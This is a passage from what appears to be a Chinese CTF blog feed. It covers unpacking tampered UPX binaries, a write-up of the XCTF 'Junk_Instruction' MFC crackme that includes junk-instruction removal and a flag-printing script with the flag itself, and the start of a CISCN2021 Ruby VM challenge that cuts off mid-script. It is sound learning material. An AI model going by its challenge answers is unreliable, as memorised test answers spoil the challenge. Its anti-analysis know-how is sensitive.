src="/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/edit1.png" class=""><img src="/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/edit2.png" class=""><p>都改成 UPX！ 就能 upx -d 解压了</p><h2 id="无法用以上方法复原的情况"><a href="#无法用以上方法复原的情况" class="headerlink" title="无法用以上方法复原的情况"></a>无法用以上方法复原的情况</h2><p>可以考虑用 gdb 调试，gcore 命令获取内存状况</p><p>也可以尝试用 radare2 解压内存</p><p>因为 upx 是开源的，所以有时候压缩方式会遭到更改</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cujo.com/upx-anti-unpacking-techniques-in-iot-malware/">https://cujo.com/upx-anti-unpacking-techniques-in-iot-malware/</a></li><li><a href="https://hackmd.io/@ishitatsuyuki/B1MDOgw4Y">https://hackmd.io/@ishitatsuyuki/B1MDOgw4Y</a></li><li><a href="https://github.com/radareorg/r2con2018/blob/master/talks/unpacking/Unpacking-a-Non-Unpackables.pdf">https://github.com/radareorg/r2con2018/blob/master/talks/unpacking/Unpacking-a-Non-Unpackables.pdf</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;TSGCTF optimized 中用到的 UPX 壳的反解压&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="upx" scheme="https://www.0wl.site/tags/upx/"/>
    
  </entry>
  
  <entry>
    <title>Xctf进阶-Junk_Instruction</title>
    <link href="https://www.0wl.site/2021/07/21/Xctf-Junk-Instruction/"/>
    <id>https://www.0wl.site/2021/07/21/Xctf-Junk-Instruction/</id>
    <published>2021-07-21T03:06:27.000Z</published>
    <updated>2021-07-21T09:53:45.121Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>一道 MFC 题，之前找验证函数是查看字符串，但在这题里不奏效，学一下根据控件 id 找函数</p></div></article><span id="more"></span><p>patch 过的程序  <a href="/2021/07/21/Xctf-Junk-Instruction/Junk_Instruction.exe">Junk Instruction.exe</a></p><h2 id="找关键函数"><a href="#找关键函数" class="headerlink" title="找关键函数"></a>找关键函数</h2><p>首先查找字符串 <code>CDialog</code> ，之后在这个字符串位置下方查看到消息映射表，在 ida 中建立如下两个结构体，分别设置类型</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc3.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">const</span> AFX_MSGMAP* (PASCAL* pfnGetBaseMap)();</span><br><span class="line">  <span class="keyword">const</span> AFX_MSGMAP_ENTRY* lpEntries;<span class="comment">//指向下面这个结构体</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UINT nMessage;</span><br><span class="line">    UINT nCode;</span><br><span class="line">    UINT nID;<span class="comment">//控件id</span></span><br><span class="line">    UINT nLastID;</span><br><span class="line">    UINT_PTR nSig;</span><br><span class="line">    AFX_PMSG pfn;<span class="comment">//对应的函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用 Resource Hacker 可以查看 check 按钮对应的 id</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc4.png" class=""><p>十六进制是 0x3e9，有一些文章里说 alt+i 查找控件 id 可以找到对应函数，但是在这题里好像找不到，所以只能根据父类的消息映射表一个个找子类映射表从而找到控件注册函数，具体寻找方法参考这 <a href="https://blog.csdn.net/SilverMagic/article/details/40622413">使用IDA定位基于MFC的CrackMe的按钮函数—–实践篇（一）</a></p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc.png" class=""><p>在地址 0x57f730（未经调试）处找到对应的入口点</p><h2 id="去花指令"><a href="#去花指令" class="headerlink" title="去花指令"></a>去花指令</h2><p>找到函数后确定 check 函数</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc5.png" class=""><p>在 check 函数可以看到 <code>__asm &#123; retn &#125;</code> 的代码，说明这里存在花指令，而这里主要存在两种花指令</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc6.png" class=""><p>call 指令相当于 push+jump，把 call 下方的地址 push 到栈里再 jump 到对应位置，这里 loc_402953 的 ebx 存放返回地址，inc ebx 把返回地址加一那么返回的地址变成 call 下面的 jump，所以这里的花指令可以把除了 mov eax，11111111h 以外的都 nop 掉</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc7.png" class=""><p>这种跟上面一样分析可以全 nop 掉</p><p>这题的花指令不算多可以手动修复，当然也可以用 idapython 脚本修复</p><p>都弄好后就可以逆 check 的逻辑</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>rc4加密，密钥是 <code>qwertyuiop</code> 密文是上面的那些赋值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag=[<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    temp=flag[i]</span><br><span class="line">    flag[i]=flag[<span class="number">31</span>-i]</span><br><span class="line">    flag[<span class="number">31</span>-i]=temp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(flag)+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;973387a11fa3f724d74802857d3e052f&#125;</span></span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/SilverMagic/article/details/40622413">使用IDA定位基于MFC的CrackMe的按钮函数—–实践篇（一）</a></li><li><a href="https://blog.csdn.net/SilverMagic/article/details/40621107">使用IDA定位基于MFC的CrackMe的按钮函数—–理论篇</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;一道 MFC 题，之前找验证函数是查看字符串，但在这题里不奏效，学一下根据控件 id 找函数&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
    <category term="MFC" scheme="https://www.0wl.site/tags/MFC/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2021 little_evil</title>
    <link href="https://www.0wl.site/2021/07/19/CISCN2021-little-evil/"/>
    <id>https://www.0wl.site/2021/07/19/CISCN2021-little-evil/</id>
    <published>2021-07-19T11:35:20.000Z</published>
    <updated>2021-07-19T12:08:55.673Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>国赛题复现</p></div></article><span id="more"></span><h2 id="分离出ruby脚本"><a href="#分离出ruby脚本" class="headerlink" title="分离出ruby脚本"></a>分离出ruby脚本</h2><p>题目给的是一个 ruby 解释器，由 ruby-packer 打包，binwalk -e 提取出 output.rb </p><img src="/2021/07/19/CISCN2021-little-evil/little_evil3.png" class=""><p>混淆严重，但是大概可以知道前面定义了几个函数，后面那一串是在调用函数。最后那个函数的 send 执行了后面那个参数，可以用 print 打印出来。之后同样还有一层再执行 print 得到最后的程序</p><img src="/2021/07/19/CISCN2021-little-evil/little_evil4.png" class=""><p>开头是$、@的是变量，改一下变量名，可以看出是 vm</p><p>print 出跳转的表</p><img src="/2021/07/19/CISCN2021-little-evil/little_evil.png" class=""><h2 id="解-vm"><a href="#解-vm" class="headerlink" title="解 vm"></a>解 vm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br></pre></td><td class="code"><pre><span class="line">vmcode=<span class="string">&#xx27;</span></span><br><span class="line">index=<span class="number">0</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">jumptable=[<span class="number">0</span>]*<span class="number">709</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+&#x27;</span>)</span><br><span class="line">raw=<span class="string">&quot;2=&gt;4, 6=&gt;8, 19=&gt;32, 43=&gt;53, 76=&gt;88, 93=&gt;95, 100=&gt;102, 105=&gt;107, 109=&gt;117, 119=&gt;124, 128=&gt;130, 135=&gt;137, 139=&gt;141, 149=&gt;164, 170=&gt;175, 180=&gt;182, 186=&gt;188, 193=&gt;195, 199=&gt;211, 213=&gt;218, 224=&gt;226, 177=&gt;227, 228=&gt;230, 235=&gt;237, 239=&gt;241, 248=&gt;261, 268=&gt;273, 278=&gt;280, 284=&gt;286, 291=&gt;293, 297=&gt;309, 311=&gt;316, 322=&gt;324, 275=&gt;325, 326=&gt;328, 333=&gt;335, 337=&gt;339, 348=&gt;363, 370=&gt;375, 380=&gt;382, 386=&gt;388, 393=&gt;395, 399=&gt;411, 413=&gt;418, 424=&gt;426, 377=&gt;427, 428=&gt;430, 435=&gt;437, 439=&gt;441, 450=&gt;466, 473=&gt;478, 483=&gt;485, 489=&gt;491, 496=&gt;498, 502=&gt;514, 516=&gt;521, 527=&gt;529, 480=&gt;530, 531=&gt;533, 538=&gt;540, 542=&gt;544, 550=&gt;565, 571=&gt;576, 581=&gt;583, 587=&gt;589, 594=&gt;596, 600=&gt;612, 614=&gt;619, 625=&gt;627, 578=&gt;628, 629=&gt;631, 633=&gt;635, 638=&gt;646, 649=&gt;656, 661=&gt;663, 665=&gt;667, 678=&gt;692, 703=&gt;705, 658=&gt;706, 4=&gt;2, 8=&gt;6, 32=&gt;19, 53=&gt;43, 88=&gt;76, 95=&gt;93, 102=&gt;100, 107=&gt;105, 117=&gt;109, 124=&gt;119, 130=&gt;128, 137=&gt;135, 141=&gt;139, 164=&gt;149, 175=&gt;170, 182=&gt;180, 188=&gt;186, 195=&gt;193, 211=&gt;199, 218=&gt;213, 226=&gt;224, 227=&gt;177, 230=&gt;228, 237=&gt;235, 241=&gt;239, 261=&gt;248, 273=&gt;268, 280=&gt;278, 286=&gt;284, 293=&gt;291, 309=&gt;297, 316=&gt;311, 324=&gt;322, 325=&gt;275, 328=&gt;326, 335=&gt;333, 339=&gt;337, 363=&gt;348, 375=&gt;370, 382=&gt;380, 388=&gt;386, 395=&gt;393, 411=&gt;399, 418=&gt;413, 426=&gt;424, 427=&gt;377, 430=&gt;428, 437=&gt;435, 441=&gt;439, 466=&gt;450, 478=&gt;473, 485=&gt;483, 491=&gt;489, 498=&gt;496, 514=&gt;502, 521=&gt;516, 529=&gt;527, 530=&gt;480, 533=&gt;531, 540=&gt;538, 544=&gt;542, 565=&gt;550, 576=&gt;571, 583=&gt;581, 589=&gt;587, 596=&gt;594, 612=&gt;600, 619=&gt;614, 627=&gt;625, 628=&gt;578, 631=&gt;629, 635=&gt;633, 646=&gt;638, 656=&gt;649, 663=&gt;661, 667=&gt;665, 692=&gt;678, 705=&gt;703, 706=&gt;658&quot;</span></span><br><span class="line">m=pattern.findall(raw)</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(m)//<span class="number">2</span>):</span><br><span class="line">    jumptable[<span class="built_in">int</span>(m[<span class="number">2</span>*i])] = <span class="built_in">int</span>(m[<span class="number">2</span>*i+<span class="number">1</span>])</span><br><span class="line"><span class="comment">#print(jumptable)</span></span><br><span 